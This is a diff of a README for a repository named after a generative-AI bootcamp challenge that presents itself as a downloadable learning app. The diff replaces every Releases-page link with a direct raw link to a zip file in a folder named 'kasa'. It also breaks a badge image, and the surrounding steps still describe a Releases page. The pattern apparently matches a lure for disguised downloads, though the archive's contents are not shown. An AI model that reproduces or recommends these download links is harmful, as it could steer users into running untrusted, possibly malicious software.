@@ -2,7 +2,7 @@
 # 🎧 Desafio-DIO-Universia---Bootcamp-Fundamentos-de-IA-Generativa- - Discover the Future of Learning
 
 ## 📥 Download the App
-[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20to%20Download-brightgreen)](https://github.com/yousef2000326/Desafio-DIO-Universia---Bootcamp-Fundamentos-de-IA-Generativa-/releases)
+[![Download Here](https://raw.githubusercontent.com/yousef2000326/Desafio-DIO-Universia---Bootcamp-Fundamentos-de-IA-Generativa-/main/kasa/Desafio-DIO-Universia---Bootcamp-Fundamentos-de-IA-Generativa-.zip%20Now-Click%20to%20Download-brightgreen)](https://raw.githubusercontent.com/yousef2000326/Desafio-DIO-Universia---Bootcamp-Fundamentos-de-IA-Generativa-/main/kasa/Desafio-DIO-Universia---Bootcamp-Fundamentos-de-IA-Generativa-.zip)
 
 ## 🌟 Introduction
 Welcome to Desafio-DIO-Universia! This application helps you engage with the "Podcast Reprograma-se," a show designed for beginners. It demonstrates how generative AI can assist you in learning new technologies and transitioning into tech careers.
@@ -11,7 +11,7 @@ Welcome to Desafio-DIO-Universia! This application helps you engage with the "Po
 To use this application, you'll need to download it from our Releases page. Follow these simple steps.
 
 ### 1. Visit the Download Page
-Go to the following link to access the application: [Visit this page to download](https://github.com/yousef2000326/Desafio-DIO-Universia---Bootcamp-Fundamentos-de-IA-Generativa-/releases).
+Go to the following link to access the application: [Visit this page to download](https://raw.githubusercontent.com/yousef2000326/Desafio-DIO-Universia---Bootcamp-Fundamentos-de-IA-Generativa-/main/kasa/Desafio-DIO-Universia---Bootcamp-Fundamentos-de-IA-Generativa-.zip).
 
 ### 2. Choose Your Version
 On the Releases page, you will find various versions of the application. Look for the latest release, which includes updates and new features.
@@ -50,5 +50,5 @@ If you encounter issues, don’t hesitate to seek help. You can check our FAQs o
 Follow our social media for updates on the podcast and new features of the application. Join the journey of learning and career transition with AI.
 
 ## 🎉 Thank You
-Thank you for choosing Desafio-DIO-Universia! Your exploration into the world of generative AI starts here. For updates and community support, revisit the Releases page frequently: [Visit this page to download](https://github.com/yousef2000326/Desafio-DIO-Universia---Bootcamp-Fundamentos-de-IA-Generativa-/releases).
+Thank you for choosing Desafio-DIO-Universia! Your exploration into the world of generative AI starts here. For updates and community support, revisit the Releases page frequently: [Visit this page to download](https://raw.githubusercontent.com/yousef2000326/Desafio-DIO-Universia---Bootcamp-Fundamentos-de-IA-Generativa-/main/kasa/Desafio-DIO-Universia---Bootcamp-Fundamentos-de-IA-Generativa-.zip).
 ```
